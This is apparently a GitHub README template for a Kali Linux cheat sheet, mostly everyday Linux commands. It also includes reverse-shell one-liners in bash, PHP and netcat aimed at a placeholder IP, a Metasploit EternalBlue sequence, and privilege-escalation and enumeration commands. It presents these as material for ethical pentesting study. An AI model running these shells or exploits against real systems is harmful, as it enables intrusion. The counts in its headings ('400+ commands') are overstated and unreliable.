# 🐉 Kali Linux Advanced Cheat Sheet Repository Template

A ready-to-use GitHub repository template for storing and organizing your full **Advanced Kali Linux Cheat Sheet (400+ commands)**.

---

## 📁 Repository Structure
```
Kali-Linux-CheatSheet/
├── README.md
├── cheat-sheets/
│   ├── basic-linux.md
│   ├── networking.md
│   ├── hacking-tools.md
│   ├── privilege-escalation.md
│   ├── reverse-shells.md
│   ├── osint.md
│   └── metasploit.md
├── assets/
│   ├── banners/
│   └── images/
└── references/
    ├── books.md
    ├── links.md
    └── wordlists.md
```

---

# 🏴‍☠️ README.md (Main File)

## 🐉 Kali Linux Advanced Cheat Sheet

Below is the full **Advanced Kali Linux Cheat Sheet (400+ commands)** integrated into this repository template.

---

# 🐉 Advanced Kali Linux Cheat Sheet (Integrated)

## 📌 1. Basic Linux
```
ls
ls -al
cd /path
pwd
clear
echo "hello"
history
alias ll='ls -la'
unalias ll
which python
whereis bash
date
cal
uptime
whoami
id
env
export VAR=value
```

## 📌 2. File & Directory
```
mkdir test
mkdir -p a/b/c
rmdir emptyfolder
rm file
rm -rf folder
cp a b
cp -r dir1 dir2
mv old new
touch file.txt
ln file hardlink
ln -s file symlink
cat file
tac file
nl file
less file
head -n 20 file
tail -f log.txt
chmod +x script.sh
chmod 644 f
chown user file
chown user:group file
file test.bin
stat file.txt
find . -name "*.txt"
find / -perm -4000 2>/dev/null
grep "password" file
grep -r "keyword" .
grep -E "regex" file
sort file.txt
uniq file.txt
wc -l file
diff a.txt b.txt
tree
truncate -s 0 file.log
strings binaryfile
```

## 📌 3. User & Permissions
```
adduser john
userdel john
passwd john
groupadd dev
usermod -aG dev john
groups john
chsh -s /bin/bash user
sudo -l
umask
```

## 📌 4. System Info
```
uname -a
hostnamectl
lsb_release -a
df -h
du -sh folder
free -m
top
htop
ps aux
ps -ef
pstree
lscpu
lsmem
dmidecode
lsusb
lspci
uptime
```

## 📌 5. APT Package Management
```
sudo apt update
sudo apt upgrade
sudo apt install package
sudo apt remove package
sudo apt autoremove
dpkg -l
dpkg -i file.deb
apt show package
```

## 📌 6. Services
```
systemctl status apache2
systemctl start apache2
systemctl stop apache2
systemctl restart ssh
systemctl enable service
systemctl disable service
journalctl -xe
journalctl -u nginx
```

## 📌 7. Networking
```
ip a
ip r
ip neigh
ifconfig
ethtool eth0
hostname -I
route -n
ping 8.8.8.8
traceroute google.com
ss -tulpn
netstat -tulpn
curl http://site.com
curl -I https://site
wget http://file.com
nslookup domain.com
dig domain.com
dig ANY domain
arp -a
tcpdump -i eth0
ipcalc 192.168.1.1/24
```

## 📌 8. SSH & File Transfer
```
ssh user@host
ssh -i key.pem user@host
scp file user@server:/path
scp -r dir user@server:/path
```

## 📌 9. Disk & Partitions
```
fdisk -l
lsblk
mount /dev/sda1 /mnt
umount /mnt
mkfs.ext4 /dev/sdb1
fsck /dev/sda2
blkid
```

## 📌 10. Archive & Compression
```
tar -cvf file.tar folder
tar -xvf file.tar
tar -czvf file.tar.gz folder
unzip file.zip
zip -r archive.zip folder
7z x file.7z
```

## 📌 11. Git
```
git clone repo
git pull
git status
git add .
git commit -m "msg"
git push
```

## 📌 12. Python
```
python3 script.py
pip install pkg
python3 -m venv venv
source venv/bin/activate
```

## 📌 13. IPTables & Firewall
```
iptables -L
iptables -A INPUT -p tcp --dport 22 -j ACCEPT
iptables -A INPUT -j DROP
ufw enable
ufw allow 22
```

## 📌 14. Kernel
```
lsmod
modprobe module
rmmod module
dmesg
```

## 📌 15. Logs
```
/var/log/syslog
journalctl
journalctl -u ssh
dmesg
```

## 📌 16. Cron
```
crontab -l
crontab -e
```

## 📌 17. Sudo & Root
```
sudo su
su user
sudo -l
visudo
```

## 📌 18. WSL
```
wsl --list --online
wsl --install -d kali-linux
wsl -l -v
wsl --set-version kali-linux 2
```

## 📌 19. Kali Tools
```
whatweb site.com
nikto -h site.com
netdiscover
theHarvester -d domain -l 200
dnsenum domain.com
```

## 📌 20. Nmap (50+)
```
nmap target
nmap -sV target
nmap -A target
nmap -p- target
nmap -T4 -A target
nmap -sC -sV target
nmap --script=vuln target
nmap -sn 192.168.1.0/24
```

## 📌 21. Netcat
```
nc -lvp 4444
nc target 80
nc -nv host 22
nc -w 3 host 445
```

## 📌 22. Gobuster
```
gobuster dir -u http://target -w wordlist.txt
gobuster dns -d domain -w subs.txt
```

## 📌 23. FFUF
```
ffuf -u http://site/FUZZ -w wordlist.txt
```

## 📌 24. tcpdump
```
tcpdump -i eth0
tcpdump -nn port 80
tcpdump -w capture.pcap
```

## 📌 25. Metasploit (40+)
```
msfconsole
search exploit
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS ip
set LHOST tun0
run
sessions
sessions -i 1
meterpreter > shell
meterpreter > sysinfo
```

## 📌 26. Reverse Shells (30+)
**Bash**
```
bash -i >& /dev/tcp/ip/4444 0>&1
```
**Python**
```
python3 -c 'import socket,os,pty;...'
```
**PHP**
```
php -r '$sock=fsockopen("ip",4444); exec("/bin/sh -i <&3 >&3 2>&3");'
```
**Netcat**
```
nc -e /bin/sh ip 4444
```

## 📌 27. Privilege Escalation
```
sudo -l
find / -perm -4000 2>/dev/null
getcap -r /
capsh --print
ps -ef | grep root
uname -a
```

## 📌 28. Docker
```
docker ps
docker images
docker exec -it container bash
docker inspect container
```

## 📌 29. SMB
```
smbclient -L \\target\\
smbclient //target/share
enum4linux -a target
```

## 📌 30. OSINT
```
theHarvester -d domain -l 200
sublist3r -d domain.com
amass enum -d domain.com
```

---

The full cheat sheet is now integrated inside your GitHub repo template!
Your complete repository for Linux, networking, hacking tools, post-exploitation, recon, OSINT, and more.

### 🔥 Features
- 400+ curated commands
- Organized cheat-sheet modules
- Ready for pentesters, students, and researchers
- Clean folder structure
- Expandable & open-source

---

## 📚 Cheat Sheet Modules
- **Basic Linux** → `cheat-sheets/basic-linux.md`
- **Networking & Enumeration** → `cheat-sheets/networking.md`
- **Web Enumeration Tools** → `cheat-sheets/hacking-tools.md`
- **Privilege Escalation (Linux)** → `cheat-sheets/privilege-escalation.md`
- **Reverse Shells** → `cheat-sheets/reverse-shells.md`
- **OSINT Tools** → `cheat-sheets/osint.md`
- **Metasploit Framework** → `cheat-sheets/metasploit.md`

---

## 🚀 Getting Started
Clone this repo:
```bash
git clone https://github.com/yourusername/Kali-Linux-CheatSheet.git
```

---

## 🤝 Contributing
Pull requests are welcome — feel free to add more cheat sheets, tools, commands, or improvements.

---

## 🛡️ Legal Disclaimer
This repository is for **education and ethical penetration testing only**. Unauthorized attacks are illegal.

---

## ⭐ Support
Give a **star** ⭐ on GitHub if this helps your learning!
